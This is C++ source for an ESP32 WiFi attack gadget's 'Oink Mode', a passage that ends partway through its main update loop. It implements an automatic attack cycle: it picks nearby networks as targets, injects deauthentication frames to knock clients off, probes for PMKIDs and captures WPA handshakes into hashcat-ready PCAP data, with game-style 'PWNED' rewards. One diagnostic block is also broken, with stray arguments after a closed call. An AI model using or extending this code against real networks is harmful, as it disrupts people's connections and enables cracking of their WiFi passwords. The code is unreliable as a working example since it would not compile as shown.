// Oink Mode implementation

#include "oink.h"
#include "donoham.h"
#include "warhog.h"
#include "../core/porkchop.h"
#include "../core/config.h"
#include "../core/wsl_bypasser.h"
#include "../core/wifi_utils.h"
#include "../core/heap_gates.h"
#include "../core/sdlog.h"
#include "../core/sd_layout.h"
#include "../core/xp.h"
#include "../core/heap_policy.h"
#include "../core/heap_health.h"
#include "../core/pc_snapshot.h"
#include "../ui/display.h"
#include "../piglet/mood.h"
#include "../piglet/avatar.h"
#include "../ui/swine_stats.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>  // For BLE coexistence check
#include <SD.h>
#include <algorithm>
#include <cstdarg>  // For va_list in deferred logging
#include <esp_heap_caps.h>
#include <esp_task_wdt.h>
#include <atomic>  // For atomic beaconCaptured flag
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

// NOTE: handshakes[]/pmkids[] vectors are Core 1 territory.
// Callback (Core 0) is a PURE ENQUEUER — copies raw frame data to pool, no vector access.
// Core 1 dequeue does all vector lookups and writes.
// vectorMux (NetworkRecon::enterCritical()) ONLY used by Core 1 for networks[] access.

// Simple flag to avoid concurrent access between promiscuous callback and main thread
// NOTE: oinkBusy is now SECONDARY protection - spinlock is PRIMARY
// The promiscuous callback runs in WiFi task context (not true ISR), but still needs
// synchronization to prevent race conditions on networks/handshakes vectors
static volatile bool oinkBusy = false;

// Autosave worker task. Pinned to Core 0 (the WiFi core) so SD I/O
// never blocks the loop task on Core 1, which is what Core 1's IDLE
// needs to run to feed the TG1WDT. Created in OinkMode::init(),
// deleted in OinkMode::stop(). Triggered by xTaskNotifyGive().
static TaskHandle_t s_autosaveTaskHandle = nullptr;

// Forward declaration so OinkMode::init() can create the task. Body
// is defined below, just before OinkMode::autoSaveCheck().
static void autosaveTask(void* arg);

// Minimum free heap thresholds (centralized in HeapPolicy)
static const size_t HANDSHAKE_ALLOC_MIN_BLOCK = sizeof(CapturedHandshake) + HeapPolicy::kHandshakeAllocSlack;
static const size_t PMKID_ALLOC_MIN_BLOCK = sizeof(CapturedPMKID) + HeapPolicy::kPmkidAllocSlack;

// ============ Deferred Event System ============
// Callback sets flags/data, update() processes them in main thread context
// This avoids heap operations, String allocations, and Serial.printf in callback

// NOTE: pendingNetworkAdd/pendingNetwork removed - NetworkRecon now handles network discovery
// OINK only tracks mood events, handshakes, and PMKIDs

// Pending mood events (callback sets flag, update() calls Mood functions)
static volatile bool pendingNewNetwork = false;
static char pendingNetworkSSID[33] = {0};
static int8_t pendingNetworkRSSI = 0;
static uint8_t pendingNetworkChannel = 0;

static volatile bool pendingDeauthSuccess = false;
static uint8_t pendingDeauthStation[6] = {0};

static volatile bool pendingHandshakeComplete = false;
static char pendingHandshakeSSID[33] = {0};
static volatile bool pendingAutoSave = false;  // Trigger autoSaveCheck from main loop

static volatile bool pendingPMKIDCapture = false;
static char pendingPMKIDSSID[33] = {0};

// Callback for NetworkRecon new network discovery -> XP events
static void onNewNetworkDiscovered(wifi_auth_mode_t authmode, bool isHidden,
                                   const char* ssid, int8_t rssi, uint8_t channel) {
    // Skip weak networks — not actionable for attack modes
    if (rssi < Config::wifi().attackMinRssi) return;
    // Queue mood event for main thread (Mood::onNewNetwork triggers XP::addXP)
    if (!pendingNewNetwork) {
        if (ssid) {
            strncpy(pendingNetworkSSID, ssid, 32);
            pendingNetworkSSID[32] = 0;
        } else {
            pendingNetworkSSID[0] = 0;
        }
        pendingNetworkRSSI = rssi;
        pendingNetworkChannel = channel;
        pendingNewNetwork = true;
    }
}

// Deferred EAPOL frame queue — Core 0 is PURE ENQUEUER, Core 1 does all vector access.
// Single frame per slot (no batching) — callback just memcpy's raw data, no vector iteration.
struct PendingEAPOLFrame {
    uint8_t bssid[6];
    uint8_t station[6];
    uint8_t messageNum;         // 1-4
    EAPOLFrame frame;           // single frame data
    uint8_t pmkid[16];          // extracted from M1 (all-zero if none)
    bool hasPMKID;
};

static const uint8_t PENDING_HS_SLOTS = 4;
static PendingEAPOLFrame pendingHsPool[PENDING_HS_SLOTS];
static uint8_t pendingHsWrite = 0;
static uint8_t pendingHsRead = 0;
static bool pendingHsAllocated[PENDING_HS_SLOTS] = {false, false, false, false};
static portMUX_TYPE oinkQueueMux = portMUX_INITIALIZER_UNLOCKED;

struct PendingPMKIDCreate {
    uint8_t bssid[6];
    uint8_t station[6];
    uint8_t pmkid[16];
    char ssid[33];
};
static const uint8_t PENDING_PMKID_SLOTS = 4;
static PendingPMKIDCreate pendingPMKIDPool[PENDING_PMKID_SLOTS];
static std::atomic<uint8_t> pendingPmkidWrite{0};
static std::atomic<uint8_t> pendingPmkidRead{0};

static bool enqueuePendingPMKID(const uint8_t* bssid, const uint8_t* station,
                                 const uint8_t* pmkidData, const char* ssid) {
    uint8_t write = pendingPmkidWrite.load(std::memory_order_relaxed);
    uint8_t next = (uint8_t)((write + 1) % PENDING_PMKID_SLOTS);
    uint8_t read = pendingPmkidRead.load(std::memory_order_acquire);
    if (next == read) return false;  // Queue full
    PendingPMKIDCreate& slot = pendingPMKIDPool[write];
    memcpy(slot.bssid, bssid, 6);
    memcpy(slot.station, station, 6);
    memcpy(slot.pmkid, pmkidData, 16);
    if (ssid && ssid[0] != 0) {
        strncpy(slot.ssid, ssid, 32);
        slot.ssid[32] = 0;
    } else {
        slot.ssid[0] = 0;
    }
    pendingPmkidWrite.store(next, std::memory_order_release);
    return true;
}

static bool dequeuePendingPMKID(PendingPMKIDCreate& out) {
    uint8_t read = pendingPmkidRead.load(std::memory_order_relaxed);
    uint8_t write = pendingPmkidWrite.load(std::memory_order_acquire);
    if (read == write) return false;  // Queue empty
    out = pendingPMKIDPool[read];
    pendingPmkidRead.store((uint8_t)((read + 1) % PENDING_PMKID_SLOTS), std::memory_order_release);
    return true;
}



// Static members
bool OinkMode::running = false;
bool OinkMode::scanning = false;
bool OinkMode::deauthing = false;
bool OinkMode::channelHopping = true;
uint8_t OinkMode::currentChannel = 1;
uint32_t OinkMode::lastHopTime = 0;
uint32_t OinkMode::lastScanTime = 0;
static uint32_t lastCleanupTime = 0;

// networks reference - now uses shared NetworkRecon vector
// This provides backward compatibility with existing code that uses 'networks'
static inline std::vector<DetectedNetwork>& networks() {
    return NetworkRecon::getNetworks();
}
std::vector<CapturedHandshake> OinkMode::handshakes;
std::vector<CapturedPMKID> OinkMode::pmkids;
int OinkMode::targetIndex = -1;
uint8_t OinkMode::targetBssid[6] = {0};
char OinkMode::targetSSIDCache[33] = {0};
uint8_t OinkMode::targetClientCountCache = 0;
uint8_t OinkMode::targetBssidCache[6] = {0};
bool OinkMode::targetHiddenCache = false;
bool OinkMode::targetCacheValid = false;
DetectedClient OinkMode::targetClients[MAX_CLIENTS_PER_NETWORK] = {};
uint8_t OinkMode::targetClientCount = 0;
int OinkMode::selectionIndex = 0;
std::atomic<uint32_t> OinkMode::packetCount{0};
uint32_t OinkMode::deauthCount = 0;
uint32_t OinkMode::deauthTxOk = 0;
uint32_t OinkMode::deauthTxErrors = 0;
uint32_t OinkMode::eapolRxCount = 0;
uint32_t OinkMode::eapolRxNoKey = 0;
uint32_t OinkMode::eapolRxNotTarget = 0;
uint16_t OinkMode::filteredCount = 0;
uint64_t OinkMode::filteredCache[64] = {0};
uint8_t OinkMode::filteredCacheIndex = 0;

// Memory limits to prevent OOM
const size_t MAX_NETWORKS = 200;       // Max tracked networks
const size_t MAX_HANDSHAKES = 50;      // Max handshakes (each can be large)
const size_t MAX_PMKIDS = 50;          // Max PMKIDs (smaller than handshakes)
const uint16_t MAX_BEACON_SIZE = 1500; // IEEE 802.11 practical limit (protect against oversized/malformed frames)

// Protocol constants
static const uint8_t MAC_ADDR_LEN = 6;
static const uint8_t SSID_MAX_LEN = 32;
static const uint8_t SSID_BUF_LEN = 33;  // SSID + null terminator
static const uint8_t PMKID_LEN = 16;
static const uint8_t PMKID_KDE_TOTAL_LEN = 22;  // dd(1) + len(1) + OUI(3) + type(1) + PMKID(16)
static const uint16_t EAPOL_MIN_LEN = 99;  // Minimum EAPOL-Key frame size
static const uint16_t EAPOL_MAX_PAYLOAD = 512;  // Max EAPOL payload for storage
static const uint16_t FRAME_MAX_CAPTURE = 300;  // Max full 802.11 frame size for PCAP
static const uint16_t DEAUTH_FRAME_SIZE = 26;
static const uint16_t BEACON_FIXED_FIELDS = 36;  // Fixed fields before IEs
static const uint16_t EAPOL_MIC_OFFSET = 81;  // MIC field offset in EAPOL-Key
static const uint16_t EAPOL_ANONCE_OFFSET = 17;  // ANonce field offset in EAPOL-Key
static const uint16_t EAPOL_KEYDATA_LEN_OFFSET = 97;  // Key Data Length field offset
static const uint16_t EAPOL_KEYDATA_OFFSET = 99;  // Key Data field offset

// Timing constants
static const uint32_t DEAUTH_BURST_INTERVAL_MS = 180;  // Optimal deauth burst interval (prevents queue saturation)

// Beacon frame storage for PCAP (required for hashcat)
static uint8_t beaconFrameStorage[MAX_BEACON_SIZE] = {0};
uint8_t* OinkMode::beaconFrame = beaconFrameStorage;
uint16_t OinkMode::beaconFrameLen = 0;
std::atomic<bool> OinkMode::beaconCaptured{false};  // Atomic initialization for thread safety

// BOAR BROS - excluded networks (fixed array in BSS, zero heap)
OinkMode::BoarBro OinkMode::boarBros[50] = {};
uint16_t OinkMode::boarBrosCount = 0;
static const size_t MAX_BOAR_BROS = 50;  // Max excluded networks

// Channel hop order (most common channels first)
const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
const uint8_t CHANNEL_COUNT = sizeof(CHANNEL_HOP_ORDER);
uint8_t currentHopIndex = 0;

// Deauth timing
static uint32_t lastDeauthTime = 0;
static uint32_t lastMoodUpdate = 0;

// Random hunting sniff - periodic sniff to show piglet is actively hunting
static uint32_t lastRandomSniff = 0;
static const int RANDOM_SNIFF_CHANCE = 8;  // 8% chance per second = ~12 sec average

void OinkMode::recordFilteredNetwork(const uint8_t* bssid) {
    uint64_t key = bssidToUint64(bssid);
    for (size_t i = 0; i < sizeof(filteredCache) / sizeof(filteredCache[0]); i++) {
        if (filteredCache[i] == key) {
            return;
        }
    }
    filteredCache[filteredCacheIndex] = key;
    filteredCacheIndex = (filteredCacheIndex + 1) % (sizeof(filteredCache) / sizeof(filteredCache[0]));
    if (filteredCount < 999) {
        filteredCount++;
    }
}

// Auto-attack state machine (like M5Gotchi)
enum class AutoState {
    SCANNING,       // Scanning for networks
    PMKID_HUNTING,  // Active PMKID probing phase
    LOCKING,        // Locked to target channel, discovering clients
    ATTACKING,      // Deauthing + sniffing target
    WAITING,        // Delay between attacks
    NEXT_TARGET,    // Move to next target
    BORED           // No targets available - pig is bored
};
static AutoState autoState = AutoState::SCANNING;
static uint32_t stateStartTime = 0;
static uint32_t attackStartTime = 0;
static const uint32_t SCAN_TIME = 5000;         // 5 sec initial scan
// LOCK_TIME now uses SwineStats::getLockTime() for class buff support
static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
static const uint32_t WAIT_TIME = 4500;         // 4.5 sec between targets (allows late EAPOL M3/M4)
static const uint32_t BORED_RETRY_TIME = 30000; // 30 sec between retry scans when bored
static const uint32_t BORED_THRESHOLD = 3;      // Failed target attempts before bored

// PMKID hunting variables
static int pmkidTargetIndex = 0;
static uint32_t pmkidProbeTime = 0;
static const uint32_t PMKID_TIMEOUT = 300;      // 300ms wait per AP
static const uint32_t PMKID_HUNT_MAX = 30000;   // 30s total hunt window
static uint64_t pmkidProbedBitset = 0;           // Tracks probed networks (up to 64)

// Targeting heuristics
static const uint32_t CLIENT_RECENT_MS = 10000;      // Prefer clients seen within 10s
static const uint32_t LOCK_FAST_TRACK_MS = 2500;     // Fast-track lock when clients appear quickly
static const uint32_t LOCK_EARLY_EXIT_MS = 4000;     // Bail if no clients show up quickly
// Attack cooldown is now RSSI-scaled (4-12s) — see ATTACKING timeout handler

// Target warm-up gate (avoid locking before recon has signal density)
static const uint32_t TARGET_WARMUP_MIN_MS = 1500;    // Minimum time before target selection
static const uint32_t TARGET_WARMUP_FORCE_MS = 5000;  // Allow targeting even if quiet
static const uint32_t TARGET_WARMUP_MIN_PACKETS = 200;
static const uint8_t TARGET_WARMUP_MIN_NETWORKS = 2;
static const uint8_t TARGET_MAX_ATTEMPTS = 4;

// Bored state tracking
static uint8_t consecutiveFailedScans = 0;      // Track failed getNextTarget() calls
static uint32_t lastBoredUpdate = 0;            // For periodic bored mood updates

// Recon warm-up tracking
static uint32_t oinkStartMs = 0;
static uint32_t reconPacketStart = 0;

static bool isWarmForTargets(uint32_t now);
static uint8_t computeQualityScore(const DetectedNetwork& net, uint32_t now);
static int computeTargetScore(const DetectedNetwork& net, uint32_t now);
static bool isEligibleTarget(const DetectedNetwork& net, uint32_t now);

// WAITING state variables (reset in init() to prevent stale state on restart)
static bool checkedForPendingHandshake = false;
static bool hasPendingHandshake = false;

// Reset bored state on init
static bool boredStateReset = true;  // Flag to reset on start()

// Last pwned network SSID for display
static char lastPwnedSSID[33] = "";

void OinkMode::init() {
    // Reset busy flag in case of abnormal stop
    oinkBusy = false;
    
    // Reset deferred event system
    pendingNewNetwork = false;
    pendingDeauthSuccess = false;
    pendingHandshakeComplete = false;
    pendingPMKIDCapture = false;
    
    // Reset bored state tracking
    consecutiveFailedScans = 0;
    lastBoredUpdate = 0;
    boredStateReset = true;

    // Reset static pool tracking under spinlock (callback may still be active briefly)
    taskENTER_CRITICAL(&oinkQueueMux);
    for (int i = 0; i < PENDING_HS_SLOTS; i++) {
        pendingHsAllocated[i] = false;
    }
    pendingHsWrite = 0;
    pendingHsRead = 0;
    taskEXIT_CRITICAL(&oinkQueueMux);
    pendingPmkidWrite = 0;
    pendingPmkidRead = 0;

    // Free per-handshake beacon memory
    for (auto& hs : handshakes) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
    }
    
    // networks vector is now managed by NetworkRecon - just clear OINK-specific data
    handshakes.clear();
    handshakes.shrink_to_fit();
    pmkids.clear();
    pmkids.shrink_to_fit();

    handshakes.reserve(5);
    pmkids.reserve(10);
    filteredCount = 0;
    memset(filteredCache, 0, sizeof(filteredCache));
    filteredCacheIndex = 0;
    
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    clearTargetClients();
    selectionIndex = 0;
    packetCount.store(0, std::memory_order_relaxed);
    deauthCount = 0;
    deauthTxOk = 0;
    deauthTxErrors = 0;
    eapolRxCount = 0;
    eapolRxNoKey = 0;
    eapolRxNotTarget = 0;
    currentHopIndex = 0;
    
    // Reset state machine
    autoState = AutoState::SCANNING;
    stateStartTime = 0;
    attackStartTime = 0;
    lastDeauthTime = 0;
    lastPwnedSSID[0] = '\0';
    lastMoodUpdate = 0;
    lastRandomSniff = 0;
    checkedForPendingHandshake = false;
    hasPendingHandshake = false;
    
    // Clear beacon frame (static storage, no free)
    beaconFrame = beaconFrameStorage;
    beaconFrameLen = 0;
    beaconCaptured = false;
    
    // Load BOAR BROS exclusion list
    loadBoarBros();

    // Create the autosave worker task. Pinned to Core 0 so its SD I/O
    // never blocks the loop task on Core 1, which is what Core 1's IDLE
    // task needs to run to feed the TWDT. Stack 4 KB is enough —
    // autoSaveCheck uses small locals only.
    if (s_autosaveTaskHandle == nullptr) {
        xTaskCreatePinnedToCore(autosaveTask, "oinkAuto", 4096, nullptr,
                                0 /* priority: below loop */,
                                &s_autosaveTaskHandle, 0 /* core 0 */);
    }
}

void OinkMode::start() {
    if (running) return;
    
    Serial.printf("[OINK] Starting... free=%u\r\n", ESP.getFreeHeap());
    
    // Register our packet callback BEFORE starting NetworkRecon — prevents a
    // TG1WDT race window where promiscuous is active but modeCallback is null,
    // causing NetworkRecon's own beacon processing to call enterCritical()
    // (= taskENTER_CRITICAL(&vectorMux)) from Core 0.
    NetworkRecon::setPacketCallback(promiscuousCallback);
    
    // Ensure NetworkRecon is running (handles WiFi promiscuous mode)
    if (!NetworkRecon::isRunning()) {
        NetworkRecon::start();
    }

    // DIAG: log WiFi/heap state at OINK start so we can diagnose ERR 257
    {
        wifi_mode_t mode = WIFI_MODE_NULL;
        esp_wifi_get_mode(&mode);
        wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
        uint8_t ch = 0;
        esp_wifi_get_channel(&ch, &second);
        Serial.printf("[OINK-DIAG] start: mode=%d ch=%d free=%u largest=%u phy_init_done=%d\n",
                      (int)mode, (int)ch,
                      (unsigned)ESP.getFreeHeap(),
                      (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL),
                      (int)NetworkRecon::isRunning());
    }
    
    // Initialize WSL bypasser for deauth frame injection
    WSLBypasser::init();
    NetworkRecon::setNewNetworkCallback(onNewNetworkDiscovered);
    
    running = true;
    scanning = true;
    channelHopping = true;
    lastHopTime = millis();
    lastScanTime = millis();
    oinkStartMs = lastScanTime;
    reconPacketStart = NetworkRecon::getPacketCount();
    
    // Set grass animation speed for OINK mode
    Avatar::setGrassSpeed(120);  // ~8 FPS casual trot
    
    // Initialize auto-attack state machine
    autoState = AutoState::SCANNING;
    stateStartTime = millis();
    selectionIndex = 0;
    
    Mood::setStatusMessage("hunting truffles");
    Mood::setDialogueLock(true);
    Display::setWiFiStatus(true);
    
    Serial.printf("[OINK] Started. Networks available: %d\r\n", NetworkRecon::getNetworkCount());
}

void OinkMode::stop() {
    if (!running) return;

    Serial.println("[OINK] Stopping...");

    deauthing = false;
    scanning = false;

    // Stop grass animation
    Avatar::setGrassMoving(false);

    // Delete the autosave worker task before clearing the data
    // structures it reads. vTaskDelete is synchronous — the task
    // is guaranteed not running when this returns.
    if (s_autosaveTaskHandle != nullptr) {
        vTaskDelete(s_autosaveTaskHandle);
        s_autosaveTaskHandle = nullptr;
    }

    // Clear our callbacks (NetworkRecon keeps running)
    NetworkRecon::setPacketCallback(nullptr);
    NetworkRecon::setNewNetworkCallback(nullptr);
    
    // Unlock channel if we locked it
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    
    // Process any deferred XP saves
    XP::processPendingSave();
    
    // Reset beacon frame (static storage, no free)
    beaconFrame = beaconFrameStorage;
    beaconFrameLen = 0;
    beaconCaptured = false;
    clearTargetClients();
    
    // Free per-handshake beacon memory to prevent leaks on repeated start/stop
    for (auto& hs : handshakes) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
    }
    
    // FIX: Release vector capacity to recover heap (~6KB leak)
    handshakes.clear();
    handshakes.shrink_to_fit();
    pmkids.clear();
    pmkids.shrink_to_fit();
    
    // Reset static pool tracking under spinlock
    taskENTER_CRITICAL(&oinkQueueMux);
    for (int i = 0; i < PENDING_HS_SLOTS; i++) {
        pendingHsAllocated[i] = false;
    }
    pendingHsWrite = 0;
    pendingHsRead = 0;
    taskEXIT_CRITICAL(&oinkQueueMux);
    pendingPmkidWrite = 0;
    pendingPmkidRead = 0;

    running = false;
    Mood::setDialogueLock(false);
    Display::setWiFiStatus(false);
    
    Serial.printf("[OINK] Stopped. Networks: %d, Handshakes: %d\r\n", 
                  NetworkRecon::getNetworkCount(), handshakes.size());
}

void OinkMode::update() {
    if (!running) return;

    uint32_t now = millis();

    // State-transition trace: print only when autoState changes, not every tick.
    // This is cheap (one integer compare per loop) and gives us a clear timeline
    // in the serial log up to the moment of the TG1WDT.
    {
        static AutoState lastAutoState = AutoState::SCANNING;
        if (autoState != lastAutoState) {
            auto nameOf = [](AutoState s) -> const char* {
                switch (s) {
                    case AutoState::SCANNING:       return "SCANNING";
                    case AutoState::PMKID_HUNTING:  return "PMKID_HUNTING";
                    case AutoState::NEXT_TARGET:    return "NEXT_TARGET";
                    case AutoState::LOCKING:        return "LOCKING";
                    case AutoState::ATTACKING:      return "ATTACKING";
                    case AutoState::WAITING:        return "WAITING";
                    case AutoState::BORED:          return "BORED";
                }
                return "?";
            };
            Serial.printf("[OINK] state %s -> %s t=%u\r\n",
                          nameOf(lastAutoState), nameOf(autoState), (unsigned)now);
            lastAutoState = autoState;
        }
    }

    // DIAG: periodic heap/WiFi state — prints every 2s. The most recent line
    // before a TG1WDT reset tells us the state right when the watchdog fired.
    {
        static uint32_t lastDiagMs = 0;
        static uint32_t maxDiagGapMs = 0;
        static uint32_t maxGapAtMs = 0;       // boot-relative ms when maxGap happened
        if (now - lastDiagMs > 2000) {
            // IDLE-starvation measurement: the loop iterates hundreds of
            // times per second normally, so each diag print should be
            // ~2000 ms apart. If it's more, the loop was blocked from
            // running for the excess — meaning Core 1 IDLE was starved
            // for that duration (the TWDT checks IDLE on Core 1 by
            // default). Recording the timestamp of the worst starve
            // lets us correlate it with the state-machine log.
            const uint32_t gap = now - lastDiagMs;
            if (gap > maxDiagGapMs) {
                maxDiagGapMs = gap;
                maxGapAtMs = now;
            }
            const uint32_t idleStarvedMs = (gap > 2000) ? (gap - 2000) : 0;
            lastDiagMs = now;
            uint8_t ch = 0;
            wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
            esp_wifi_get_channel(&ch, &second);
#ifdef NETRECON_LOCK_PROFILE
            // Read the per-tick lock-hold profile built up over the last
            // ~2 seconds, then reset for the next window. Format: max=NNNus
            // total=NNNus calls=NN. With NETRECON_LOCK_PROFILE off, this
            // block compiles to nothing.
            uint32_t maxHold = 0, totalHold = 0, callCount = 0;
            NetworkRecon::Profile::lockProfileSnapshot(maxHold, totalHold, callCount);
            NetworkRecon::Profile::lockProfileReset();
            Serial.printf("[OINK-DIAG] t=%u free=%u largest=%u ch=%d deauthTxOk=%lu deauthTxErr=%lu hs=%u pmkid=%u auto=%d gap=%u maxGap=%u@%u idleStarved=%u lockMax=%u lockTotal=%u lockCalls=%u\r\n",
                          (unsigned)now,
                          (unsigned)ESP.getFreeHeap(),
                          (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL),
                          (int)ch,
                          (unsigned long)deauthTxOk,
                          (unsigned long)deauthTxErrors,
                          (unsigned)handshakes.size(),
                          (unsigned)pmkids.size(),
                          (int)autoState,
                          (unsigned)gap,
                          (unsigned)maxDiagGapMs,
                          (unsigned)maxGapAtMs,
                          (unsigned)idleStarvedMs,
                          (unsigned)maxHold,
                          (unsigned)totalHold,
                          (unsigned)callCount);
#else
            Serial.printf("[OINK-DIAG] t=%u free=%u largest=%u ch=%d deauthTxOk=%lu deauthTxErr=%lu hs=%u pmkid=%u auto=%d gap=%u maxGap=%u@%u idleStarved=%u\r\n",
                          (unsigned)now,
                          (unsigned)ESP.getFreeHeap(),
                          (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL),
                          (int)ch,
                          (unsigned long)deauthTxOk,
                          (unsigned long)deauthTxErrors,
                          (unsigned)handshakes.size(),
                          (unsigned)pmkids.size(),
                          (int)autoState,
                          (unsigned)gap,
                          (unsigned)maxDiagGapMs,
                          (unsigned)maxGapAtMs,
                          (unsigned)idleStarvedMs);
                          (unsigned)maxDiagGapMs,
                          (unsigned)idleStarvedMs);
#endif
        }
    }

    // Guard access to networks/handshakes vectors from promiscuous callback
    // NOTE: oinkBusy is secondary protection, spinlock is primary
    oinkBusy = true;
    
    // ============ Process Deferred Events from Callback ============
    // These events were queued in promiscuous callback to avoid heap/String ops there
    
    // NOTE: Network discovery is now handled by NetworkRecon::processDeferredEvents()
    // OINK no longer needs to process pendingNetworkAdd - this was dead code after the refactor.
    
    // Process pending mood: new network discovered
    // No spinlock needed: oinkBusy=true already prevents callback from writing.
    // CYD pattern: volatile flags are single-writer (callback) / single-reader (update).
    char pendingSSIDCopy[33] = {0};
    int8_t pendingRSSICopy = 0;
    uint8_t pendingChannelCopy = 0;
    bool hasPendingNewNetwork = false;
    if (pendingNewNetwork) {
        strncpy(pendingSSIDCopy, pendingNetworkSSID, 32);
        pendingSSIDCopy[32] = 0;
        pendingRSSICopy = pendingNetworkRSSI;
        pendingChannelCopy = pendingNetworkChannel;
        pendingNewNetwork = false;
        hasPendingNewNetwork = true;
    }
    if (hasPendingNewNetwork) {
        Mood::onNewNetwork(pendingSSIDCopy, pendingRSSICopy, pendingChannelCopy);
    }
    
    // Process pending mood: deauth success
    uint8_t pendingStationCopy[6] = {0};
    bool hasPendingDeauth = false;
    if (pendingDeauthSuccess) {
        memcpy(pendingStationCopy, pendingDeauthStation, sizeof(pendingStationCopy));
        pendingDeauthSuccess = false;
        hasPendingDeauth = true;
    }
    if (hasPendingDeauth) {
        Mood::onDeauthSuccess(pendingStationCopy);
    }
    
    // Process pending mood: handshake complete
    char pendingHandshakeCopy[33] = {0};
    bool hasPendingHandshakeDone = false;
    if (pendingHandshakeComplete) {
        strncpy(pendingHandshakeCopy, pendingHandshakeSSID, 32);
        pendingHandshakeCopy[32] = 0;
        pendingHandshakeComplete = false;
        hasPendingHandshakeDone = true;
    }
    if (hasPendingHandshakeDone) {
        Mood::onHandshakeCaptured(pendingHandshakeCopy);
        strncpy(lastPwnedSSID, pendingHandshakeCopy, sizeof(lastPwnedSSID) - 1);
        lastPwnedSSID[sizeof(lastPwnedSSID) - 1] = '\0';
        Display::showLoot(lastPwnedSSID);  // Show PWNED banner in top bar
    }

    // Process pending mood: PMKID captured (clientless attack - extra special!)
    char pendingPMKIDCopy[33] = {0};
    bool hasPendingPMKID = false;
    if (pendingPMKIDCapture) {
        strncpy(pendingPMKIDCopy, pendingPMKIDSSID, 32);
        pendingPMKIDCopy[32] = 0;
        pendingPMKIDCapture = false;
        hasPendingPMKID = true;
    }
    if (hasPendingPMKID) {
        Mood::onPMKIDCaptured(pendingPMKIDCopy);
        strncpy(lastPwnedSSID, pendingPMKIDCopy, sizeof(lastPwnedSSID) - 1);
        lastPwnedSSID[sizeof(lastPwnedSSID) - 1] = '\0';
        Display::showLoot(lastPwnedSSID);  // Show PWNED banner in top bar
        SDLog::log("OINK", "PMKID captured: %s", pendingPMKIDCopy);
        
        // BUG FIX: Trigger auto-save for PMKID (was missing, causing beeps but no file)
        pendingAutoSave = true;
    }

    // Process pending auto-save (callback set flag, we do SD I/O here)
    bool shouldAutoSave = false;
    if (pendingAutoSave) {
        pendingAutoSave = false;
        shouldAutoSave = true;
    }
    if (shouldAutoSave) {
        PCSnapshot::checkpoint(PCSnapshot::PHASE_OINK_AUTOSAVE);
        // Dispatch the save to the worker task on Core 0 instead of
        // running it inline. The inline path blocks the loop on SD
        // I/O, starving Core 1's IDLE task → TG1WDT_SYS_RST. The
        // worker has its own task context; the loop returns to its
        // normal tick rate immediately.
        if (s_autosaveTaskHandle != nullptr) {
            xTaskNotifyGive(s_autosaveTaskHandle);
        } else {
            // Fallback before init() has created the worker.
            autoSaveCheck();
        }
    }
    // Core 0 was a PURE ENQUEUER — just memcpy'd raw frame data to pendingHsPool.
    // Core 1 (here) does ALL vector access: find/create handshake, store frame, check completion.
    // Copy slot under oinkQueueMux, free immediately, process outside lock.
    //
    // Cap at 2 frames per loop tick + yield between iterations. Each iteration holds
    // oinkQueueMux AND NetworkRecon::vectorMux (cross-core spinlock) while iterating
    // networks[]. A full burst of 4 frames × spinlock + vector scan + autoSaveCheck()
    // can starve the Core 0 WiFi task → TG1WDT_SYS_RST. Remaining frames drain on
    // subsequent ticks (matches the bounded pattern in NetworkRecon::processDeferredEvents).
    static PendingEAPOLFrame frameLocal;
    uint8_t hsProcessed = 0;
    const uint8_t kMaxHsPerTick = 2;
    static uint32_t hsDequeueCount = 0;
    hsDequeueCount++;
    if (hsDequeueCount <= 3 || (hsDequeueCount % 100) == 0) {
        Serial.printf("[OINK-DIAG] dequeue#%u enter read=%u write=%u\r\n",
                      (unsigned)hsDequeueCount, (unsigned)pendingHsRead, (unsigned)pendingHsWrite);
    }
    PCSnapshot::checkpoint(PCSnapshot::PHASE_OINK_DEQUEUE);
    while (hsProcessed < kMaxHsPerTick) {
        bool hasSlot = false;
        taskENTER_CRITICAL(&oinkQueueMux);
        if (pendingHsRead != pendingHsWrite && pendingHsAllocated[pendingHsRead]) {
            memcpy(&frameLocal, &pendingHsPool[pendingHsRead], sizeof(PendingEAPOLFrame));
            pendingHsAllocated[pendingHsRead] = false;
            pendingHsRead = (pendingHsRead + 1) % PENDING_HS_SLOTS;
            hasSlot = true;
        }
        taskEXIT_CRITICAL(&oinkQueueMux);

        if (!hasSlot) break;

        PCSnapshot::checkpoint(PCSnapshot::PHASE_OINK_PROCESS_EAPOL);

        // Core 1: find or create handshake entry (push_back on vector)
        int idx = findOrCreateHandshakeSafe(frameLocal.bssid, frameLocal.station);
        if (idx >= 0) {
            CapturedHandshake& hs = handshakes[idx];
            
            // Store this single frame
            uint8_t msgIdx = frameLocal.messageNum - 1;
            if (msgIdx < 4 && hs.frames[msgIdx].len == 0) {
                uint16_t copyLen = frameLocal.frame.len;
                if (copyLen > 0 && copyLen <= 512) {
                    memcpy(hs.frames[msgIdx].data, frameLocal.frame.data, copyLen);
                    hs.frames[msgIdx].len = copyLen;
                    hs.frames[msgIdx].messageNum = msgIdx + 1;
                    hs.frames[msgIdx].timestamp = millis();
                    
                    // Full 802.11 frame for PCAP
                    uint16_t fullLen = frameLocal.frame.fullFrameLen;
                    if (fullLen > 0 && fullLen <= 300) {
                        memcpy(hs.frames[msgIdx].fullFrame, frameLocal.frame.fullFrame, fullLen);
                        hs.frames[msgIdx].fullFrameLen = fullLen;
                        hs.frames[msgIdx].rssi = frameLocal.frame.rssi;
                    }
                    
                    hs.capturedMask |= (1 << msgIdx);
                    hs.lastSeen = millis();
                }
            }
            
            // SSID lookup from networks (Core 1, safe with vectorMux)
            NetworkRecon::enterCritical();
            for (const auto& net : networks()) {
                if (memcmp(net.bssid, frameLocal.bssid, 6) == 0) {
                    strncpy(hs.ssid, net.ssid, 32);
                    hs.ssid[32] = 0;
                    break;
                }
            }
